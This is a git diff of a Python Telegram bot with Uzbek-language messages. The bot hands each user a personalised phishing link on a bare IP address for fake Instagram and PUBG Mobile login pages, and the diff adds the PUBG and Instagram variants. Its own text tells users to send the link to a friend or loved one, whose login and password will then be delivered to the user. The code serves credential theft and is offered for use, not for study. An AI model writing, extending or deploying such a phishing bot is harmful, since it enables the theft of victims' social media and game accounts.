@@ -30,9 +30,9 @@ def start(update,context):
     💯Parolni olish uchun */link* tugmasini ustiga ✅
     """
     k=[
-        [KeyboardButton("📇 Link 🌐"),KeyboardButton("🧬 Tugmali Link 🌐")],
+        [KeyboardButton("Instagram 🖤 accaunt"),KeyboardButton("PUBG MOBILE 🖤 accaunt")],
         [KeyboardButton("🫂 Bizning kanal obuna bolib qoying 😁")],
-        [KeyboardButton("PUBG MOBILE 🖤 accaunt")],
+        [KeyboardButton("🧬 Tugmali Link PUBG MOBILE 🌐"),KeyboardButton("🧬 Tugmali Link Instagram 🌐")],
     ]
     reply_markup=ReplyKeyboardMarkup(k,resize_keyboard=True)
     update.message.reply_text(text,parse_mode="Markdown",reply_markup=reply_markup)
@@ -49,7 +49,9 @@ def link(update,context):
 
 def menyu(update,context):
     k=[
-        [KeyboardButton("📇 Link 🌐"),KeyboardButton("🧬 Tugmali Link 🌐")]
+        [KeyboardButton("Instagram 🖤 accaunt"),KeyboardButton("PUBG MOBILE 🖤 accaunt")],
+        [KeyboardButton("🫂 Bizning kanal obuna bolib qoying 😁")],
+        [KeyboardButton("🧬 Tugmali Link PUBG MOBILE 🌐"),KeyboardButton("🧬 Tugmali Link Instagram 🌐")],
     ]
     reply_markup=ReplyKeyboardMarkup(k,resize_keyboard=True)
     update.message.reply_text("📌 *Menyu*",parse_mode="Markdown",reply_markup=reply_markup)
@@ -64,7 +66,7 @@ def help(update,context):
 
 def text(update,context):
     text=update.message.text
-    if text=="📇 Link 🌐":
+    if text=="Instagram 🖤 accaunt":
         text=f"""
         ➡️ *http://13.60.29.35:8000/Nakrutka/{update.message.from_user.id}* ⬅️
         \n📌 Bu sizning likingiz buni *do'stizni 🫂* yoki *sevgan ❤️* insoningizga
@@ -73,12 +75,19 @@ def text(update,context):
         update.message.reply_text(text,parse_mode="Markdown")
         update.message.reply_text("Copy qilish uchun `http://13.60.29.35:8000/Nakrutka/449766528` ni ustiga bos",
                                   parse_mode="Markdown")
-    elif text=="🧬 Tugmali Link 🌐":
+    elif text=="🧬 Tugmali Link Instagram 🌐":
         k=[
             [InlineKeyboardButton("🧬",url=f"http://13.60.29.35:8000/Nakrutka/{update.message.from_user.id}")]
         ]
         update.message.reply_text("🧬 Tugmali Link 🌐", parse_mode="Markdown",reply_markup=InlineKeyboardMarkup(k))
         update.message.reply_text("Copy qilish uchun `http://13.60.29.35:8000/Nakrutka/449766528` ni ustiga bos",
+                                  parse_mode="Markdown")
+    elif text=="🧬 Tugmali Link PUBG MOBILE 🌐":
+        k=[
+            [InlineKeyboardButton("🧬",url=f"http://13.60.29.35:8000/Pubg/{update.message.from_user.id}")]
+        ]
+        update.message.reply_text("🧬 Tugmali Link 🌐", parse_mode="Markdown",reply_markup=InlineKeyboardMarkup(k))
+        update.message.reply_text("Copy qilish uchun `http://13.60.29.35:8000/Pubg/449766528` ni ustiga bos",
                                   parse_mode="Markdown")
 
     elif text=="🫂 Bizning kanal obuna bolib qoying 😁":
@@ -100,13 +109,7 @@ def text(update,context):
                                   parse_mode="Markdown")
 
     else:
-        text = f"""
-        ➡️ *http://13.60.29.35:8000/Nakrutka/{update.message.from_user.id}* ⬅️
-        \n📌 Bu sizning likingiz buni *do'stizni 🫂* yoki *sevgan ❤️* insoningizga
-        \nyuborsangiz. Linkga kirsa *login* va *parol* kiritsa sizga keladi 
-        """
-        update.message.reply_text(text, parse_mode="Markdown")
-        update.message.reply_text("Copy qilish uchun `http://13.60.29.35:8000/Nakrutka/449766528` ni ustiga bos",
+        update.message.reply_text("*Menyulardan foydalaning /menyu 🫂*",
                                   parse_mode="Markdown")
 
 
@@ -131,3 +134,4 @@ def main():
 
 if __name__ == '__main__':
     main()
+
